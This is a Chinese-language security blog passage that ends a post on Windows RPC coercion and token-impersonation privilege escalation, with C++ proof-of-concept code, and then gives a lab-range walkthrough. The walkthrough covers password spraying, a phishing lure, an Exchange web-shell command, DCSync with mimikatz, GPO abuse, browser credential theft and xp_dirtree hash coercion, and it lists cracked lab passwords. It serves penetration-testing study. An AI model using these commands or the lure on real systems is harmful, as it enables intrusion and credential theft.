class="built_in">CloseHandle</span>(phNewToken);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">GetLastError</span>() != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">RevertToSelf</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] CreateProcessAsUser() failed, possibly due to missing privileges, retrying with CreateProcessWithTokenW().\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">CreateProcessWithTokenW</span>(phNewToken, LOGON_WITH_PROFILE, <span class="literal">NULL</span>, lpCommandLine, CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE, lpEnvironment, lpCurrentDirectory, &amp;si, &amp;pi))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] CreateProcessWithTokenW success.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(phNewToken);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] CreateProcessWithTokenW failed (%d).\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(phNewToken);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RpcStringBindingComposeW"><a href="#RpcStringBindingComposeW" class="headerlink" title="RpcStringBindingComposeW"></a>RpcStringBindingComposeW</h5><p>尝试连接到目标开放的管道准备发送EFS协议的数据包</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">RPC_WSTR ObjUuid = (RPC_WSTR)<span class="string">L&quot;c681d488-d850-11d0-8c52-00c04fd90f7e&quot;</span>;</span><br><span class="line">RPC_WSTR ProtSeq = (RPC_WSTR)<span class="string">L&quot;ncacn_np&quot;</span>; </span><br><span class="line">RPC_WSTR NetworkAddr = (RPC_WSTR)<span class="string">L&quot;\\\\127.0.0.1&quot;</span>;</span><br><span class="line">RPC_WSTR Endpoint = (RPC_WSTR)<span class="string">L&quot;\\pipe\\lsarpc&quot;</span>; </span><br><span class="line">RPC_WSTR Options = <span class="literal">NULL</span>; </span><br><span class="line">RPC_WSTR StringBinding; </span><br><span class="line"></span><br><span class="line">RPC_STATUS RpcStatus;</span><br><span class="line"></span><br><span class="line">RPC_BINDING_HANDLE binding_h;</span><br><span class="line"></span><br><span class="line">RpcStatus = <span class="built_in">RpcStringBindingComposeW</span>(ObjUuid, ProtSeq, NetworkAddr, Endpoint, Options, &amp;StringBinding);</span><br><span class="line"><span class="keyword">if</span> (RpcStatus != RPC_S_OK) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] RpcStringBindingComposeW() Error: %i\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RpcStatus = <span class="built_in">RpcBindingFromStringBindingW</span>(</span><br><span class="line">    StringBinding,    <span class="comment">// Previously created string binding</span></span><br><span class="line">    &amp;binding_h    <span class="comment">// Output binding handle</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
<h5 id="EfsRpcOpenFileRaw"><a href="#EfsRpcOpenFileRaw" class="headerlink" title="EfsRpcOpenFileRaw"></a>EfsRpcOpenFileRaw</h5><p>发送EFS协议的数据包，通过EFS协议的EfsRpcOpenFileRaw函数打开\\localhost/pipe/lsarpc\C$\test.txt文件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LPWSTR PipeFileName;</span><br><span class="line"><span class="keyword">long</span> result;</span><br><span class="line"></span><br><span class="line">PipeFileName = (LPWSTR)<span class="built_in">LocalAlloc</span>(LPTR, MAX_PATH * <span class="built_in"><span class="keyword">sizeof</span></span>(WCHAR));</span><br><span class="line"><span class="built_in">StringCchPrintf</span>(PipeFileName, MAX_PATH, <span class="string">L&quot;\\\\localhost/pipe/lsarpc\\C$\\test.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] Invoking EfsRpcOpenFileRaw with target path: %ws.\r\n&quot;</span>, PipeFileName);</span><br><span class="line">PVOID hContext;</span><br><span class="line">result = <span class="built_in">Proc0_EfsRpcOpenFileRaw_Downlevel</span>(binding_h, &amp;hContext, PipeFileName, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h2 id="MS-DFSNM协议"><a href="#MS-DFSNM协议" class="headerlink" title="MS-DFSNM协议"></a>MS-DFSNM协议</h2><p><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979</a><br>该协议通过<strong>\pipe\NETDFS</strong>通信，uuid为4FC742E0-4A10-11CF-8273-00AA004AE673，dfs协议的进程为dfssvc.exe,该进程只有一个管道。<br>dfs协议第一次启用时，在win2012上会访问一个默认不存在的 \pipe\winreg 管道，该管道会在DFS协议使用过后才进行监听，进程为svchost.exe。或使用 / 的特性换成其他管道利用。</p>
<h3 id="MS-DFSNM中继"><a href="#MS-DFSNM中继" class="headerlink" title="MS-DFSNM中继"></a>MS-DFSNM中继</h3><p>dfs和petitpotam一样</p>
<h3 id="MS-DFSNM提权"><a href="#MS-DFSNM提权" class="headerlink" title="MS-DFSNM提权"></a>MS-DFSNM提权</h3><p>管道模拟提权流程<br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003824571.png" alt="image-20231029003824571"></p>
<h2 id="RPC-code-C"><a href="#RPC-code-C" class="headerlink" title="RPC-code-C++"></a>RPC-code-C++</h2><p>在官方文档中找到idl<br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003835478.png" alt="image-20231029003835478">编译后会生成对应的文件和代码，我们是对客户端编程，所以用不到ms-dfsnm_s.c<br><img src="https://cdn.nlark.com/yuque/0/2023/png/21719413/1676196314996-d7692b7f-8a16-4adb-b762-816b4a13c9cf.png#averageHue=%23fcfcfb&clientId=u45fbd7d3-71c6-4&from=paste&height=92&id=ue7376734&originHeight=136&originWidth=849&originalType=binary&ratio=1.4749999046325684&rotation=0&showTitle=false&size=11166&status=done&style=none&taskId=uaf65944a-f26b-4c35-ae69-1150d9a24fd&title=&width=575.593257554475" alt="image.png"><br>发现编译后还是报错<br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003840633.png" alt="image-20231029003840633"><br>去官方文档找这两个函数，同时链接rpcrt4.lib，不再报错<br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003844977.png" alt="image-20231029003844977"><br>这个时候就可以编译成功，可以进行编写poc了</p>
<p>先看一下RPC的连接流程<br><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003854954.png" alt="image-20231029003854954"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ms-dfsnm_h.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;ms-dtyp.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;rpcrt4.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    RPC_STATUS status;</span><br><span class="line">    RPC_WSTR StringBinding;</span><br><span class="line">    RPC_BINDING_HANDLE Binding;</span><br><span class="line"></span><br><span class="line">    status = <span class="built_in">RpcStringBindingCompose</span>(</span><br><span class="line">        (RPC_WSTR)<span class="string">L&quot;4FC742E0-4A10-11CF-8273-00AA004AE673&quot;</span>, <span class="comment">//uuid</span></span><br><span class="line">        (RPC_WSTR)<span class="string">L&quot;ncacn_np&quot;</span>,      <span class="comment">//protocol sequence</span></span><br><span class="line">        (RPC_WSTR)<span class="string">L&quot;\\\\127.0.0.1&quot;</span>, <span class="comment">//ip</span></span><br><span class="line">        (RPC_WSTR)<span class="string">L&quot;\\pipe\\netdfs&quot;</span>,    <span class="comment">//pipe</span></span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;StringBinding      <span class="comment">//RPC输出</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[+] RpcStringBindingCompose status code: %d\r\n&quot;</span>, status);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[+] String binding: %ws\r\n&quot;</span>, StringBinding);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定RPC</span></span><br><span class="line">    status = <span class="built_in">RpcBindingFromStringBinding</span>(StringBinding, &amp;Binding);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[+] RpcBindingFromStringBinding status code: %d\r\n&quot;</span>, status);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//释放RPC字符串</span></span><br><span class="line">    status = <span class="built_in">RpcStringFree</span>(&amp;StringBinding);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[+] RpcStringFree status code: %d\r\n&quot;</span>, status);</span><br><span class="line"></span><br><span class="line">    RpcTryExcept&#123;</span><br><span class="line">        <span class="comment">//RPC操作的任意代码</span></span><br><span class="line">        <span class="comment">//查阅微软文档知道 NetDfsAddStdRoot函数的写法</span></span><br><span class="line">        LPWSTR pipeFileName;</span><br><span class="line">    <span class="keyword">long</span> result;</span><br><span class="line">    pipeFileName = (LPWSTR)<span class="built_in">LocalAlloc</span>(LPTR, MAX_PATH * <span class="built_in"><span class="keyword">sizeof</span></span>(WCHAR));</span><br><span class="line">    <span class="built_in">wprintf</span>(pipeFileName, MAX_PATH, <span class="string">L&quot;\\\\127.0.0.1/pipe/qwe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    status = <span class="built_in">NetrDfsAddStdRoot</span>(Binding, pipeFileName, (WCHAR*)<span class="string">&quot;test&quot;</span>, (WCHAR*)<span class="string">&quot;comment&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;[+] NetrDfsAddStdRoot Send Successful. status code: %d\r\n&quot;</span>, status);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">RpcExcept</span>(EXCEPTION_EXECUTE_HANDLER); &#123;</span><br><span class="line">    <span class="built_in">wprintf</span>(<span class="string">L&quot;Exception: %d - 0x%08x\r\n&quot;</span>, <span class="built_in">RpcExceptionCode</span>(), <span class="built_in">RpcExceptionCode</span>());</span><br><span class="line">&#125;</span><br><span class="line">RpcEndExcept</span><br><span class="line"></span><br><span class="line">status = <span class="built_in">RpcBindingFree</span>(&amp;Binding);</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;[+] RpcStringFree status code: %d\r\n&quot;</span>, status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __RPC_FAR* __RPC_USER <span class="title">midl_user_allocate</span><span class="params">(<span class="keyword">size_t</span> cBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span>((<span class="keyword">void</span> __RPC_FAR*) <span class="built_in">malloc</span>(cBytes));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __RPC_USER <span class="title">midl_user_free</span><span class="params">(<span class="keyword">void</span> __RPC_FAR* p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="模拟管道客户端"><a href="#模拟管道客户端" class="headerlink" title="模拟管道客户端"></a>模拟管道客户端</h3><p>在potato提权系列的早期，他们的利用思路大致相同：利用com接口的一些特性，欺骗 NT AUTHORITY\SYSTEM 账户连接并验证到攻击者控制的RPC服务器。通过一系列的api调用来执行NTLM relay，并为 NT AUTHORITY\system 账户在本地生成一个访问令牌，最后窃取这个令牌，并使用 CreateProcessWithToken() 或者 CreateProcessAsUser() 函数传入令牌创建新进程，以获取system权限<br>CreateProcessWithToken() 和 CreateProcessAsUser() 函数允许服务器应用在客户端的安全上下文中创建进程。例如，对公开RPC/com接口的Windows服务，当调用高权限的rpc函数时，该服务可能会调用 RpcImpersonateClient() 函数来模拟客户端，以在客户端的安全上下文中运行代码或创建进程，以降低提权漏洞的风险。<br>需要注意的是，调用CreateProcessWithToken() 和 CreateProcessAsUser() 函数分别需要拥有 SeImpersonatePrivilege 和 SeAssignPrimaryTokenPrivilege 特权，拥有这两个特权的一般是</p>
<ul>
<li>管理员账户（RID 500）</li>
<li>NT AUTHORITY\Local Service</li>
<li>NT AUTHORITY\Network Serivce</li>
</ul>
<p>CreateProcessWithToken()和CreateProcessAsUser()两个函数都可以用于创建一个新进程，不同之处在于它们创建进程所使用的token不同。</p>
<ul>
<li>CreateProcessWithToken() 函数使用指定的用户令牌来创建新进程。这个用户令牌通常是从另一个活动的用户会话中获取的，并且需要具有必要的访问权限才能打开。</li>
<li>CreateProcessAsUser() 函数使用指定的用户身份验证信息（用户名和密码）来创建新进程，并且在运行时将其转换为一个有效的用户令牌。这个函数通常用于在服务或系统级别上以用户身份启动进程。</li>
</ul>
<p>因此，主要区别在于使用哪种类型的令牌进行进程创建：一个预先存在的用户令牌或者在运行时根据用户身份验证信息创建的新令牌。</p>
<p>因此通过模拟令牌的方法适用于将管理员权限或服务用户权限提权至system，这也是各种土豆提权的原理。</p>
<p>Windows还提供了 ImpersonateNamedPipeClient() 函数，也就是说pipe server可以模拟已连接的 pipe client，这就提供了一个思路：可以去欺骗高权限进程去连接我们创建的 命名管道，通过令牌窃取的思路获得客户端的令牌，并在特权令牌的上下文中创建进程。</p>
<h2 id="模拟权限"><a href="#模拟权限" class="headerlink" title="模拟权限"></a>模拟权限</h2><ol>
<li> 前往以下位置打开ApplicationHost.config:<br>C:\Windows\System32\inetsrv\config </li>
<li> 在ApplicationHost.config中找到对应您的Application pool的部分： </li>
</ol>
<p><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003909705.png" alt="image-20231029003909705"></p>
<ol start="3">
<li> 加入 <processModel manualgroupmembership="true"></processModel></li>
</ol>
<p><img src="/2023/10/29/RPC%E5%AD%A6%E4%B9%A0/image-20231029003913289.png" alt="image-20231029003913289"></p>
<ol start="4">
<li> 修改完成后保存，保存完成后使用以下指令重启IIS：<br>net stop was<br>net start w3svc </li>
</ol>
<p>这个参数可以阻止ApplicationPoolIdentity被自动加入到IIS_IUSRS组中，从而阻止ApplicationPoolIdentity自动继承IIS_IUSRS的权限。</p>
<p>安装NtObjectManager</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-Module</span> <span class="literal">-Name</span> NtObjectManager <span class="literal">-RequiredVersion</span> <span class="number">1.1</span>.<span class="number">32</span></span><br></pre></td></tr></table></figure>
<h4 id="localService"><a href="#localService" class="headerlink" title="localService"></a>localService</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PsExec.exe -i -d -u &quot;NT AUTHORITY\LocalService&quot; cmd</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sess</span> = <span class="built_in">Get-NtToken</span> <span class="literal">-Session</span></span><br><span class="line"><span class="variable">$token</span> = <span class="built_in">Get-NtToken</span> <span class="literal">-Service</span> LocalService <span class="literal">-AdditionalGroups</span> <span class="variable">$sess</span>.LogonSid.Sid</span><br><span class="line"><span class="built_in">New-Win32Process</span> cmd <span class="literal">-Token</span> <span class="variable">$token</span> <span class="literal">-CreationFlags</span> NewConsole</span><br></pre></td></tr></table></figure>

<h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$p</span> = <span class="built_in">Start-Win32ChildProcess</span> powershell</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>dragon 靶场WP</title>
    <url>/2023/12/06/dragon_wp/</url>
    <content><![CDATA[<p>靶场搭建：</p>
<p><a href="https://github.com/0range-x/dragon-lab">https://github.com/0range-x/dragon-lab</a></p>
<h4 id="ws01-owa钓鱼"><a href="#ws01-owa钓鱼" class="headerlink" title="ws01-owa钓鱼"></a>ws01-owa钓鱼</h4><p>扫描结果</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610145158181.png" alt="image-20220610145158181"></p>
<p>ftp匿名上传</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610150402228.png" alt="image-20220610150402228"></p>
<p>制作用户名字典</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610145441403.png" alt="image-20220610145441403"></p>
<p>构造字典msf爆破成功，字典用的rockyou.txt</p>
<p>成功登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gaohexie/sweetpea#1</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/06/dragon_wp/image-20220530201823355.png" alt="image-20220530201823355"></p>
<p><img src="/2023/12/06/dragon_wp/image-20220530204556396.png" alt="image-20220530204556396"></p>
<p>构造话术</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关于自测钓鱼后门的通知</span><br><span class="line"></span><br><span class="line">您好，近期公司组织攻防演练，发现攻击方使用钓鱼邮件进行攻击，已有多名同事中招，请下载后门检测工具，扫描机器是否被横向攻击。另外，希望同时提高安全意识，谨防被钓鱼攻击</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/06/dragon_wp/image-20220610171548716.png" alt="image-20220610171548716"></p>
<p><img src="/2023/12/06/dragon_wp/image-20220610172746519.png" alt="image-20220610172746519"></p>
<h4 id="ws02-exchange-rce"><a href="#ws02-exchange-rce" class="headerlink" title="ws02-exchange rce"></a>ws02-exchange rce</h4><p>cve-2021-26857</p>
<p><img src="/2023/12/06/dragon_wp/image-20220531011647320.png" alt="image-20220531011647320"></p>
<p>成功写入shell</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610175250310.png" alt="image-20220610175250310"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command=Response.Write(new%20ActiveXObject(&quot;Wscript.Shell&quot;).exec(&quot;whoami&quot;).Stdout.ReadAll());</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/06/dragon_wp/image-20220610175807860.png" alt="image-20220610175807860"></p>
<p>python 开启web服务 下载木马上线</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610180300395.png" alt="image-20220610180300395"></p>
<p><img src="/2023/12/06/dragon_wp/image-20220610180350796.png" alt="image-20220610180350796"></p>
<p>成功上线system</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610181305844.png" alt="image-20220610181305844"></p>
<p>定位域控</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610181557699.png" alt="image-20220610181557699"></p>
<p><img src="/2023/12/06/dragon_wp/image-20220610181619682.png" alt="image-20220610181619682"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=haishitest,DC=lab&quot; -PrincipalIdentity gaohexie -Rights DCSync</span><br><span class="line"></span><br><span class="line">mimi.exe &quot;lsadump::dcsync /domain:haishitest.lab /user:administrator /csv&quot; exit</span><br></pre></td></tr></table></figure>

<p>导入powerview</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610185611737.png" alt="image-20220610185611737"></p>
<p>添加普通用户dcsync权限</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610185706320.png" alt="image-20220610185706320"></p>
<p>winrm登录</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610191808759.png" alt="image-20220610191808759"></p>
<p>执行上线</p>
<p><img src="/2023/12/06/dragon_wp/image-20220610191749387.png" alt="image-20220610191749387"></p>
<p>抓到liaide的密码，该用户拥有dcsync权限，直接dcsync</p>
<h4 id="ws04-as-rep"><a href="#ws04-as-rep" class="headerlink" title="ws04- as_rep"></a>ws04- as_rep</h4><p><img src="/2023/12/06/dragon_wp/image-20220611111126318.png" alt="image-20220611111126318"></p>
<p>发现maluzi用户存在as_rep</p>
<p>制作行为习惯字典</p>
<p><a href="https://github.com/bigb0sss/goPassGen">https://github.com/bigb0sss/goPassGen</a></p>
<p>生成字典</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611112033126.png" alt="image-20220611112033126"></p>
<p>爆破成功</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611112307187.png" alt="image-20220611112307187"></p>
<p>成功登录ws04机器</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611112607475.png" alt="image-20220611112607475"></p>
<p>发现xmanager目录</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611112645500.png" alt="image-20220611112645500"></p>
<p>上传解密工具</p>
<p>抓到密码</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611113043484.png" alt="image-20220611113043484"></p>
<h4 id="ws05-空路径提权-dpapi解密"><a href="#ws05-空路径提权-dpapi解密" class="headerlink" title="ws05-空路径提权+dpapi解密"></a>ws05-空路径提权+dpapi解密</h4><p>winrm登录服务器</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611115111856.png" alt="image-20220611115111856"></p>
<p>先上线cs</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611115911283.png" alt="image-20220611115911283"></p>
<p>3389远程连接</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611162919473.png" alt="image-20220611162919473"></p>
<p>查找可以服务提权的路径</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611164849727.png" alt="image-20220611164849727"></p>
<p>查看该服务</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611164936672.png" alt="image-20220611164936672"></p>
<p>停止该服务</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611165039353.png" alt="image-20220611165039353"></p>
<p>修改配置文件并启动上线</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611165607649.png" alt="image-20220611165607649"></p>
<p><img src="/2023/12/06/dragon_wp/image-20220611165552896.png" alt="image-20220611165552896"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Program Files (x86)\AnyDesk\AnyDesk.exe --service</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611165647665.png" alt="image-20220611165647665"></p>
<p>cs不稳定 反弹到nc</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611170952128.png" alt="image-20220611170952128"></p>
<p>上传解密工具</p>
<p>谷歌浏览器解密工具</p>
<p><a href="https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.3">https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.3</a></p>
<p><img src="/2023/12/06/dragon_wp/image-20220611171432318.png" alt="image-20220611171432318"></p>
<p><img src="/2023/12/06/dragon_wp/image-20220611171422055.png" alt="image-20220611171422055"></p>
<p>注入到administrator进程</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611171716537.png" alt="image-20220611171716537"></p>
<p>抓取成功</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611171925433.png" alt="image-20220611171925433"></p>
<p>读取密码</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611172041142.png" alt="image-20220611172041142"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zhaolinlu:tEKO4f4CQ1BPPz~LQm</span><br></pre></td></tr></table></figure>



<h4 id="ws06-08-GPO批量上线"><a href="#ws06-08-GPO批量上线" class="headerlink" title="ws06-08-GPO批量上线"></a>ws06-08-GPO批量上线</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\zhaolinlu\Desktop&gt;StandIn_v13_Net45.exe --gpo --filter work --acl</span><br><span class="line"></span><br><span class="line">[?] Using DC : ws13.haishi.lab</span><br><span class="line">[+] GPO result count         : 1</span><br><span class="line">    |_ Result limit          : 50</span><br><span class="line">    |_ Applying search filter</span><br><span class="line"></span><br><span class="line">[?] Object   : CN=&#123;07D9CE42-10BD-436D-89AA-3B2EFAF47766&#125;</span><br><span class="line">    Path     : LDAP://CN=&#123;07D9CE42-10BD-436D-89AA-3B2EFAF47766&#125;,CN=Policies,CN=System,DC=haishi,DC=lab</span><br><span class="line">    GPCFilesysPath : \\haishi.lab\SysVol\haishi.lab\Policies\&#123;07D9CE42-10BD-436D-89AA-3B2EFAF47766&#125;</span><br><span class="line">    Path           : OK</span><br><span class="line"></span><br><span class="line">[+] Account       : CREATOR OWNER</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : FullControl</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : InheritOnly</span><br><span class="line"></span><br><span class="line">[+] Account       : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : ReadAndExecute, Synchronize</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br><span class="line"></span><br><span class="line">[+] Account       : NT AUTHORITY\Authenticated Users</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : ReadAndExecute, Synchronize</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br><span class="line"></span><br><span class="line">[+] Account       : NT AUTHORITY\SYSTEM</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : FullControl</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br><span class="line"></span><br><span class="line">[+] Account       : HAISHI\Domain Admins</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : FullControl</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br><span class="line"></span><br><span class="line">[+] Account       : HAISHI\Enterprise Admins</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : FullControl</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br><span class="line"></span><br><span class="line">[+] Account       : HAISHI\zhaolinlu</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : FullControl</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br></pre></td></tr></table></figure>



<p><img src="/2023/12/06/dragon_wp/image-20220603180211010.png" alt="image-20220603180211010"></p>
<p>建立计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">StandIn_v13_Net45.exe --gpo  --filter work --tasktype computer --taskname task01 --author &quot;haishi\Administrator&quot; --command &quot;powershell.exe /c&quot; --args &quot;net localgroup &#x27;administrators&#x27; zhaolinlu /add&quot;</span><br></pre></td></tr></table></figure>



<p><a href="https://github.com/rootSySdk/PowerGPOAbuse">https://github.com/rootSySdk/PowerGPOAbuse</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add-GPOGroupMember -Member &#x27;zhaolinlu&#x27; -GPOIdentity &#x27;work&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/06/dragon_wp/image-20220603173932739.png" alt="image-20220603173932739"></p>
<p>同样的方式在ws08机器上发现mssql的sa账号密码</p>
<p><img src="/2023/12/06/dragon_wp/image-20220611174633555.png" alt="image-20220611174633555"></p>
<h4 id="sql01-xp-cmd-监听hash"><a href="#sql01-xp-cmd-监听hash" class="headerlink" title="sql01-xp_cmd 监听hash"></a>sql01-xp_cmd 监听hash</h4><p>登录成功</p>
<p><img src="/2023/12/06/dragon_wp/image-20220612001442223.png" alt="image-20220612001442223"></p>
<p>执行xp_dirtree，监听得到hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master.sys.xp_dirtree &#x27;\\192.168.200.15\simblog.txt&#x27;,0,1;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/12/06/dragon_wp/image-20220612003930132.png" alt="image-20220612003930132"></p>
<p><img src="/2023/12/06/dragon_wp/image-20220612003957326.png" alt="image-20220612003957326"></p>
<p>拿到mssql服务账户的hash</p>
<p><img src="/2023/12/06/dragon_wp/image-20220612004012595.png" alt="image-20220612004012595"></p>
<p>使用大字典rockyou.txt爆破出密码</p>
<p><img src="/2023/12/06/dragon_wp/image-20220612004949511.png" alt="image-20220612004949511"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wuxinqi:xxotisxx14.</span><br></pre></td></tr></table></figure>



<h4 id="sql02-tv接管"><a href="#sql02-tv接管" class="headerlink" title="sql02-tv接管"></a>sql02-tv接管</h4><p>3389成功登录该机器</p>
